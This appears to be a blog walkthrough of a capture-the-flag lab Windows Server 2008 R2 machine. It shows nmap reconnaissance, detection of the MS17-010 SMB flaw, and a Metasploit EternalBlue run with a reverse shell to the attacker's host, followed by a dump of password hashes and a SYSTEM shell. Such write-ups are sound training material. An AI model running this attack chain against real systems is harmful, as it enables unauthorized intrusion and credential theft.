---
image: "/assets/img/posts/eternal_6a4c48072b.jpg"
title: "Windows Hacking"
description: "Detailed offensive security CTF walkthrough and exploit analysis for Windows-hacking."
pubDate: "2023-09-18"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
Welcome back,fellow Hackers, to The Hacking Journey, In this exciting Series we will be diving deep into the world of Boot2root CTFs. If youre new to the concept of Boot2root, its essentially a type of Capture The Flag (CTF) challenge where you simulate hacking into a target system to find hidden flags. Curious? [Learn more here](https://blackcybersec.xyz/posts/Ressources-for-hackers/):



The Best Academy to Learn Hacking is [Here](https://affiliate.hackthebox.com/nenandjabhata).Beginner Friendly challenges on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).

## Recon Time:



During this enumeration phase, we will systematically scan the network for open ports, gather information about their versions, and explore potential vulnerabilities associated with these ports. Join us as we dive deep into the art of reconnaissance.



Basic nmap scan:



  `





```bash

└─# nmap $ip    

Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 09:49 EDT

Nmap scan report for 10.150.X.X

Host is up (0.20s latency).

Not shown: 985 closed tcp ports (reset)

PORT      STATE SERVICE

53/tcp    open  domain

80/tcp    open  http

135/tcp   open  msrpc

139/tcp   open  netbios-ssn

445/tcp   open  microsoft-ds

1433/tcp  open  ms-sql-s

3389/tcp  open  ms-wbt-server

8089/tcp  open  unknown

49152/tcp open  unknown

49153/tcp open  unknown

49154/tcp open  unknown

49155/tcp open  unknown

49156/tcp open  unknown

49157/tcp open  unknown

49158/tcp open  unknown



```

`



In this output as we can see, we have a lot of ports thats open. we have also an web server running of port 80. Now, lets dive deeper into its services by running Nmap again, this time using the -sC and -sV flags, to uncover more details and potential vulnerabilities.



  `





```bash

└─# nmap -sV -Pn -p- $ip 

Not shown: 56764 closed tcp ports (reset), 8757 filtered tcp ports (no-response)

PORT      STATE SERVICE            VERSION

53/tcp    open  domain             Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)

80/tcp    open  http               Microsoft IIS httpd 7.5

135/tcp   open  msrpc              Microsoft Windows RPC

139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn

445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: WORKGROUP)

1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100; RTM

3389/tcp  open  ssl/ms-wbt-server?

47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

49152/tcp open  msrpc              Microsoft Windows RPC

49153/tcp open  msrpc              Microsoft Windows RPC

49154/tcp open  msrpc              Microsoft Windows RPC

49155/tcp open  msrpc              Microsoft Windows RPC

49156/tcp open  msrpc              Microsoft Windows RPC

49158/tcp open  msrpc              Microsoft Windows RPC

Service Info: Host: VictimPC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows



```

`



Weve uncovered a multitude of open ports on this target, each potentially offering a pathway for exploration and vulnerability assessment. Notable open ports include:



Port 53/tcp: Running a DNS service (domain).Port 80/tcp: Hosting an HTTP web server.Port 135/tcp: Associated with Microsoft RPC (msrpc).Ports 139/tcp and 445/tcp: Running NetBIOS services and Microsoft DS respectively.Port 1433/tcp: An MSSQL service.Port 3389/tcp: Likely an MS Windows Remote Desktop Protocol (ms-wbt-server).



Now, lets explore whats waiting for us on port 80. Well use the curl command to access the web server running on this port:



  `





```bash

─# curl http://$ip                    



Love This Song!!!





```

`



In the source code of the web page, a noteworthy discovery emerges: Mr Blue aka MS17-010. This MS17-010 refers to the Common Vulnerabilities and Exposures identifier CVE-2017-0144. To delve deeper into this revelation, lets conduct a quick search within Nmaps scripts:



  `





```bash

└─# ls /usr/share/nmap/scripts | grep "ms17"  

smb-vuln-ms17-010.nse



```

`



Our search leads us to a script named smb-vuln-ms17-010.nse. This script is a crucial tool for identifying and assessing the vulnerability associated with CVE-2017-0144.



  `





```bash

─# nmap -Pn -p139,445 --script=smb-vuln-ms17-010.nse $ip

Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 10:19 EDT

Nmap scan report for 10.150.X.X

Host is up (0.17s latency).



PORT    STATE SERVICE

139/tcp open  netbios-ssn

445/tcp open  microsoft-ds



Host script results:

| smb-vuln-ms17-010: 

|   VULNERABLE:

|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

|     State: VULNERABLE

|     IDs:  CVE:CVE-2017-0143

|     Risk factor: HIGH

|       A critical remote code execution vulnerability exists in Microsoft SMBv1

|        servers (ms17-010).

|           

|     Disclosure date: 2017-03-14

|     References:

|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx



Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds



```

`



The Nmap scan has revealed that the target system is vulnerable to CVE-2017-0144. This revelation serves as a pivotal moment as we move forward into the next stage of our mission: Exploitation.



## Exploitation Time:



During this Exploitation phase, well harness the power of the detected vulnerability (CVE-2017-0144) to gain unauthorized access and control over the target system. Our first step in this journey is to employ the searchsploit tool to scour for any potential vulnerabilities, setting the stage for our exploration into system compromise.



  `





```bash

└─# searchsploit ms17-010

 Exploit Title 

 Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) 

 (Metasploit) 

    | windows/dos/41891.rb



```

`



Having identified a Metasploit module for this CVE, Im ready to proceed by launching my msfconsole -q for the exploitation phase.



  `





```bash

┌──(kali㉿kali)-[~]

└─$ msfconsole -q   

msf6 > search eternalblue

0  exploit/windows/smb/ms17_010_eternalblue



```

`



The initial command i executed in Metasploit is the search command followed by the eternalblue, as you can see i found an ` exploit/windows/smb/ms17_010_eternalblue`,



  `





```bash

msf6 > use exploit/windows/smb/ms17_010_eternalblue

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts  10.150.X.X 

rhosts => 10.150.X.X

msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0

lhost => 10.66.X.X



```

`



Ive configured all the necessary settings for this exploit. The next step involves launching the command exploit or run.



  `





```bash

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit 



[*] Started reverse TCP handler on 10.66.X.X:4444 

[*] 10.150.X.X:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check

[+] 10.150.X.X:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)

[*] 10.150.X.X:445    - Scanned 1 of 1 hosts (100% complete)

[+] 10.150.X.X:445 - The target is vulnerable.

[*] 10.150.X.X:445 - Connecting to target for exploitation.

[+] 10.150.X.X:445 - Connection established for exploitation.

[+] 10.150.X.X:445 - Target OS selected valid for OS indicated by SMB reply

[*] 10.150.X.X:445 - CORE raw buffer dump (53 bytes)

[*] 10.150.X.X:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2

[*] 10.150.X.X:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris

[*] 10.150.X.X:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P

[*] 10.150.X.X:445 - 0x00000030  61 63 6b 20 31   

[*] Meterpreter session 1 opened (10.66.66.50:4444 -> 10.150.X.X:51221) at 2023-09-18 10:49:19 -0400

meterpreter >



```

`



WIN, We have successfully got our session opened in the machine as you can see we have a meterpreter shell. If you don't know how to use the meterpreter shell, you can execute the help command to see all available commands. for me i will Just launch the hashdump command.



  `





```bash

meterpreter > hashdump 

Administrator:500:aad3b435b51404eeaad3b435b51404ee:483c7adb3e1378e9a187b42baa228745:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

meterpreter >



```

`



I have dumped the Administrator password hashes and same for the Guest user… I will now switch on the shell command line.



  `





```bash

meterpreter > shell

Process 1332 created.

Channel 1 created.

Microsoft Windows [Version 6.1.7601]

Copyright (c) 2009 Microsoft Corporation.  All rights reserved.



C:\Windows\system32>whoami

whoami

nt authority\system



```

`



Now i will search my FLAG on the machine :)



  `





```bash

C:\>dir

dir

 Volume in drive C has no label.

 Volume Serial Number is F80A-FDD9



 Directory of C:\



06/27/2016  09:36 AM              inetpub

07/14/2009  03:20 AM              PerfLogs

01/17/2020  06:27 PM              Program Files

10/25/2019  09:04 AM              Program Files (x86)

05/23/2019  08:33 PM              Users

01/17/2020  06:27 PM              Windows

               0 File(s)              0 bytes

               6 Dir(s)  23,354,429,440 bytes free



```

`



I accessed on the Users directory and found administrator user.



  `





```bash

05/23/2019  08:14 PM              Documents

01/17/2020  06:30 PM              Downloads

05/23/2019  08:14 PM              Favorites

05/23/2019  08:14 PM              Links

05/23/2019  08:14 PM              Music

05/23/2019  08:14 PM              Pictures

05/23/2019  08:14 PM              Saved Games

05/23/2019  08:14 PM              Searches

05/23/2019  08:14 PM              Videos

               0 File(s)              0 bytes

              13 Dir(s)  23,354,363,904 bytes free



C:\Users\Administrator.GNBUSCA-W054>cd Desktop  

cd Desktop



C:\Users\Administrator.GNBUSCA-W054\Desktop>dir

dir

 Volume in drive C has no label.

 Volume Serial Number is F80A-FDD9



 Directory of C:\Users\Administrator.GNBUSCA-W054\Desktop



05/24/2019  03:18 PM              .

05/24/2019  03:18 PM              ..

05/24/2019  03:19 PM                40 FLAG.txt

               1 File(s)             40 bytes

               2 Dir(s)  23,354,363,904 bytes free



```

`



Got my FLAG.txt.



Thanks for reading. See you Soon. Lets learn, explore, and hack together. Join us on Discord [here](https://discord.gg/wBT9wr9ruG).



 Share        [](https://twitter.com/intent/tweet?text=Windows%20Hacking%20for%20Beginners%20-%20Mr%20Blue%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2FWindows-hacking%2F)       [](https://www.facebook.com/sharer/sharer.php?title=Windows%20Hacking%20for%20Beginners%20-%20Mr%20Blue%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2FWindows-hacking%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2FWindows-hacking%2F&text=Windows%20Hacking%20for%20Beginners%20-%20Mr%20Blue%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2FWindows-hacking%2F)

